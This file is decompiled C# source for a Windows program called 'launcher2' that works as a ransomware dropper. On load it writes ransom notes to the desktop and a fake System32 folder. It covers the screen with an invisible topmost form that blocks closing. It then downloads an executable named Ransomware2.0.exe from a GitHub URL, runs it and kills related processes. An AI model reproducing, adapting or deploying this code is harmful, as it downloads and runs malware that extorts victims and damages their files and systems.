using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;

namespace launcher2._0;

public class launcher2 : Form
{
	private IContainer components = null;

	public launcher2()
	{
		InitializeComponent();
		((Form)this).set_TransparencyKey(((Control)this).get_BackColor());
	}

	private void launcher2_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void launcher2_Load(object sender, EventArgs e)
	{
		Directory.CreateDirectory("C:\\Program Files\\System32");
		File.WriteAllText("C:\\Program Files\\System32\\README.txt", "You were encrypted by Clutter, good luck...");
		((Control)this).set_Left(0);
		((Control)this).set_Top(0);
		((Control)this).set_Width(Screen.get_PrimaryScreen().get_Bounds().Width);
		((Control)this).set_Height(Screen.get_PrimaryScreen().get_Bounds().Height);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string path = folderPath + "\\._cache_DCQPKX.exe";
		if (!File.Exists(path))
		{
			string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			using StreamWriter streamWriter = File.CreateText(folderPath2 + "\\._cache_DCQPKX.exe");
			streamWriter.WriteLine("Ur files has been locked :-)");
		}
		string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		using (StreamWriter streamWriter2 = File.CreateText(folderPath3 + "\\README.txt"))
		{
			streamWriter2.WriteLine("Ur files has been locked :-)");
		}
		ServicePointManager.Expect100Continue = true;
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		WebClient webClient = new WebClient();
		webClient.DownloadFile("https://github.com/Clutter-Test/Ransom_File_For_Tutorial/raw/master/Rasomware2.0.exe", "C:\\Program Files\\System32\\Ransomware2.0.exe");
		Process.Start("C:\\Program Files\\System32\\Ransomware2.0.exe");
		Process[] array = null;
		array = Process.GetProcessesByName("DCQPKX");
		Process[] array2 = array;
		foreach (Process process in array2)
		{
			process.Kill();
		}
		Process[] array3 = null;
		array3 = Process.GetProcessesByName("._cache_DCQPKX");
		Process[] array4 = array3;
		foreach (Process process2 in array4)
		{
			process2.Kill();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(16, 17));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("launcher2");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Control)this).set_Text("launcher");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(launcher2_FormClosing));
		((Form)this).add_Load((EventHandler)launcher2_Load);
		((Control)this).ResumeLayout(false);
	}
}
